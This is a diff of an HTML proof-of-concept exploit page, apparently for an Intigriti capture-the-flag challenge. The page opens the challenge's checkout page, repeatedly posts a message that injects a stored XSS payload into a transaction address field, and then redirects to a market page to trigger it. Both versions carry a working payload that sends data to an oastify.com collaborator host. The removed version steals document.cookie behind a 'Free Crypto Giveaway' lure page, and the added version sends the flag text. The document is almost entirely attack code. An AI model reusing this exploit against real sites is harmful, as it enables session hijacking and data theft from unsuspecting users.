@@ -1,39 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <title>Free Crypto Giveaway - Limited Time!</title>
-    <style>
-        body { background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 20%; }
-    </style>
+    <title>Intigriti January Challenge PoC</title>
 </head>
-<body>
-    <h1>Initializing MarketWatch Exploit...</h1>
-    <p>Do not close this tab.</p>
+<body style="background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 50px;">
+    <h1>Initiating Heist...</h1>
+    <p>Following the trail of coins...</p>
 
     <script>
-        // Use 1337COIN since that's what the Admin holds
-        const VICTIM_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        const TARGET_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
         
-        // This payload breaks out of the title="" attribute and injects an image tag
-        // that sends the Admin's cookies/local storage to your OAST endpoint.
-        const XSS_PAYLOAD = '"><img src=x onerror="window.location=\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?data=\'+btoa(document.cookie)">';
-        
-        // Step 1: Open the target in a new tab
-        const victimWindow = window.open(VICTIM_URL, '_blank');
-        
-        // Step 2: Wait 4 seconds for the Admin's Wallet API to load
-        setTimeout(() => {
-            victimWindow.postMessage({
+        // This XSS payload breaks out of the title attribute in marketwatch.html
+        // and sends the flag text to your collaborator.
+        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag=' + document.getElementById('flagText').innerText)">`;
+
+        // 1. Open the checkout page in a new window
+        const win = window.open(TARGET_URL);
+
+        // 2. Spam the postMessage every 500ms
+        // This ensures we hit the Admin's page the millisecond their wallets load
+        let count = 0;
+        const spammer = setInterval(() => {
+            win.postMessage({
                 type: 'submitTransaction',
                 transaction: {
+                    toAddress: XSS, // Inject XSS here
                     currency: '1337COIN',
-                    amount: 1, 
-                    toAddress: '10970063d33e32396bb80753a2b902d568' // Injecting XSS into the Address field!
+                    amount: 0.00000001
                 }
             }, '*');
             
-            console.log("XSS Payload Injected into Transaction DB!");
-        }, 4000); 
+            count++;
+            if (count > 20) clearInterval(spammer);
+        }, 500);
+
+        // 3. After the transaction is sent, redirect the Admin to MarketWatch
+        // to trigger the stored XSS.
+        setTimeout(() => {
+            win.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
+        }, 8000);
     </script>
 </body>
 </html>
